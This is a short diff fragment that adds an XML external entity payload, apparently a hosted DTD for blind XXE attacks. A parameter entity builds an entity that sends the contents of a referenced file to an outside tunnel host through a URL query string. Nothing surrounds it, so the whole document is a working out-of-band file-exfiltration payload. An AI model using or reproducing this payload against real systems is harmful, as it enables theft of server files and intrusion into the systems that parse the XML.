@@ -1,0 +1,2 @@
+<!ENTITY % payload "<!ENTITY send SYSTEM 'https://aa8a6fdc0ec742.lhr.life/out?data=%file;'>">
+%payload;
